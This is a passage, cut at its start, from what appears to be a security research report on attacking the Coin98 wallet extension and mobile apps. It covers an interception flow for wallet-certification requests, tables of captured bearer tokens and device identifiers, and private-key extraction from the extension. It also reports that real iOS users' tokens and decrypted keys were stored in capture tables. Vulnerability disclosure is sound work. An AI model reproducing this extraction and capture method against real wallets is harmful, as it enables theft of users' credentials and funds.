    │   → ATTACKER RETURNS: fake certification response
    │
    ├─ On wallet deletion:
    │   POST /adapters/wallet/zen/ucertify
    │   Host: internal.c98staging.dev
    │   Authorization: Bearer <jwt>
    │
    │   → ATTACKER CAPTURES: deletion event, same credentials
    │
    └─ (Potential) On auth token refresh:
        POST /api/v1/auth/refresh
        Host: api-dagora-dev.c98staging.dev
        Authorization: Bearer <current-token>

        → ATTACKER CAPTURES: current auth token
        → ATTACKER RETURNS: crafted replacement token
```

### What An Attacker Gets (Proven)

| Data | How | Count (PoC) |
|------|-----|-------------|
| Wallet UUIDs | Request body `id` field | 3-4 unique |
| Device UUIDs | Request body `device` field + JWT `id` claim | 3 unique |
| Bearer JWTs (HS256) | Authorization header | 10 unique |
| JWT signing structure | Token decode | `{id, source, isOnChain, iat, exp}` |
| IP addresses | Request metadata | 4 unique IPs (Vietnam) |
| User agent / platform | Request headers | iOS 14.4.2, Coin98Wallet/16.9.0 |

---

# PART 3: Cross-Platform Correlation

## 3.1 Combined Attack Surface

| Vector | Extension | Mobile | Combined Impact |
|--------|-----------|--------|-----------------|
| **Private key extraction** | sync_wallet + aes_decrypt → plaintext keys | Not via MITM | Extension = critical, mobile = intel |
| **Wallet enumeration** | 152 wallets with addresses + chains | Wallet UUIDs from acertify | Cross-reference wallet UUIDs to addresses |
| **Device identification** | deviceId from connect_coin98 | Device UUID from JWT + body | Same user across platforms |
| **Session state** | get_session (lock state) | JWT expiry = session validity | Know when user is active |
| **Credential capture** | Extension password (in Redux) | Bearer JWTs (HS256) | Full auth material |

## 3.2 What We Proved (Evidence in Supabase)

| Finding | Evidence | Table |
|---------|----------|-------|
| Extension: 152 wallets extracted | `drain_captures` | Supabase |
| Extension: 2 private keys decrypted + verified | `drain_captures` | Supabase |
| Mobile: 27 authenticated requests captured | `captures` | Supabase |
| Mobile: 10 unique JWTs from 3 real iOS devices | `captures` | Supabase |
| Mobile: wallet-device UUID mappings | `captures` | Supabase |

## 3.3 What We Cannot Do (Honest Assessment)

| Claim | Reality |
|-------|---------|
| "MITM all adapter calls" | NO — only wallet certification goes to our domain |
| "Inject fake balances" | NO — balance queries go to encrypted.coin98.com/tech |
| "Modify transactions" | NO — tx construction goes to production backends |
| "Auth refresh hijack" | UNPROVEN — zero Coin98 app requests to dagora auth endpoint |
| "Forge valid JWTs" | UNKNOWN — HS256 secret not found in bundle |

---

# PART 4: File Reference

| File | Platform | Purpose |
|------|----------|---------|
| `extension/aeachknmefphepccionboohckonoeemg/src/manifest.json` | Extension | Manifest, permissions, content scripts |
| `extension/.../src/static/background/index_10.4.1.js` | Extension | Service worker — all business logic (20MB) |
| `extension/.../src/contents.e02f0287.js` | Extension | ISOLATED world message bridge (21KB) |
| `extension/.../src/takePlaces.f90f5315.js` | Extension | MAIN world provider injector (2.6KB) |
| `extension/.../src/inpage.e40da296.js` | Extension | Injected provider — window.coin98 (571KB) |
| `android/v16.9.0/base_extracted/assets/index.android.bundle` | Android | React Native JS bundle (85MB) |
| `android/v16.9.0/base_extracted/AndroidManifest.xml` | Android | Permissions, deep links, config |
| `ios/extracted/Payload/Coin98.app/main.jsbundle` | iOS | React Native JS bundle (145MB) |
| `ios/extracted/Payload/Coin98.app/Info.plist` | iOS | App config, URL schemes |
| `ios/extracted/Payload/Coin98.app/aes.js` | iOS | Standalone AES (EvpKDF) implementation |
